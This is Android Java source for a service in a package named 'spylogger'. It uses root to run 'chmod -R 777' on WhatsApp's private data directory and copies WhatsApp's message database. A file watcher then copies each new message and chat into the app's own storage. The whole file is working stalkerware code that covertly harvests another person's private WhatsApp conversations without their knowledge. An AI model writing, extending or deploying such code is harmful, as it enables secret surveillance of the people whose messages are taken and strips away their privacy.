package com.gravatasufoca.spylogger.services;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Binder;
import android.os.FileObserver;
import android.os.IBinder;
import android.util.Log;

import com.gravatasufoca.spylogger.dao.whatsapp.DatabaseHelperExternal;
import com.gravatasufoca.spylogger.dao.whatsapp.DatabaseHelperInternal;
import com.gravatasufoca.spylogger.model.whatsapp.ChatList;
import com.gravatasufoca.spylogger.model.whatsapp.Messages;
import com.gravatasufoca.spylogger.utils.Utils;
import com.j256.ormlite.dao.Dao;
import com.stericson.RootTools.RootTools;
import com.stericson.RootTools.execution.CommandCapture;

import java.io.File;
import java.io.IOException;
import java.sql.SQLException;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

public class WhatsAppService extends Service {

	private String pathToWatch;
	private Dao<Messages, Integer> daoMsgInternal;
	private Dao<Messages, Integer> daoMsgExternal;
	private Dao<ChatList, Integer> daoChatInternal;
	private Dao<ChatList, Integer> daoChatExternal;

	private DatabaseHelperInternal internal;
	private DatabaseHelperExternal external;
    private final IBinder mBinder = new LocalBinder();
    private boolean loaded=false;

    public class LocalBinder extends Binder {
    	WhatsAppService getService() {
            return WhatsAppService.this;
        }
    }

	public WhatsAppService() {
	}

	@Override
	public IBinder onBind(Intent intent) {
		return mBinder;
	}

	private void chmod() {

		try{
			CommandCapture command = new CommandCapture(0, "chmod -R 777 "
				+ android.os.Environment.getDataDirectory().toString()
				+ "/data/com.whatsapp", "chmod -R 777 "
						+ getApplicationContext().getPackageManager()
						.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir);
			RootTools.getShell(true).add(command);
		}catch(Exception e){
			e.printStackTrace();
		}

	}

	@Override
	public void onCreate() {

		pathToWatch = android.os.Environment.getDataDirectory().toString()
				+ "/data/com.whatsapp/databases/msgstore.db";

		chmod();
		try {
			String inFileName = getApplicationContext().getPackageManager()
					.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
					+ "/databases/msgstore.db";

			File dest = new File(inFileName);

			if (!dest.exists()) {

				File source = new File(pathToWatch);
				try {

					File dir = new File(
							getApplicationContext().getPackageManager()
									.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
									+ "/databases/");
					if (!dir.exists())
						dir.mkdir();

					dest.createNewFile();
					Utils.copyFile(source, dest);
				} catch (IOException e) {
					e.printStackTrace();
				}
			}

		} catch (NameNotFoundException e) {
			e.printStackTrace();
		}


	}


	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		Log.d("WHATSLOG - FLAGS", Integer.toString(flags));

		internal = new DatabaseHelperInternal(getApplicationContext());
		external = new DatabaseHelperExternal(getApplicationContext());

		try {
			daoMsgInternal = internal.getMessagesDao();
			daoMsgExternal = external.getMessagesDao();
			daoChatInternal = internal.getChatDao();
			daoChatExternal = external.getChatDao();

		} catch (Exception e) {
		}

		if(Utils.whatsObserver==null)
			setObserver();

		Log.d("WHATSLOG - OBSESRVER", Utils.whatsObserver.toString());

		return START_REDELIVER_INTENT;
	}

	private void setObserver(){
		Utils.whatsObserver = new FileObserver(pathToWatch) { // set up a file observer to
			// watch this directory on
			// sd card

			@Override
			public void onEvent(int event, String file) {

				switch (event) {
				case FileObserver.MODIFY:
					Log.d("DEBUG", "MODIFY:" + pathToWatch + file);

					updateMsg();
					updateChat();
					break;
				default:
					// just ignore
					break;
				}

			}
		};
		Utils.whatsObserver.startWatching(); // START OBSERVING
	}

	private void updateMsg() {

		try {
			List<Messages> mensagens = daoMsgInternal.queryForAll();
			List<Messages> m = daoMsgExternal.queryForAll();
			Set<Messages> nova = new HashSet<Messages>();
			for (Messages mensagem : m) {

				if (!mensagens.contains(mensagem)) {
					nova.add(mensagem);
				}

			}

			for (Messages mensagem : nova) {
				try {
					daoMsgInternal.create(mensagem);
				} catch (SQLException e) {
					e.printStackTrace();
				}
			}

		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private void updateChat() {

		try {
			List<ChatList> chats = daoChatInternal.queryForAll();
			List<ChatList> m = daoChatExternal.queryForAll();
			Set<ChatList> nova = new HashSet<ChatList>();
			for (ChatList chat : m) {

				if (!chats.contains(chat)) {
					nova.add(chat);
				}

			}

			for (ChatList chat : nova) {
				try {
					daoChatInternal.create(chat);
				} catch (SQLException e) {
					e.printStackTrace();
				}
			}

		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
}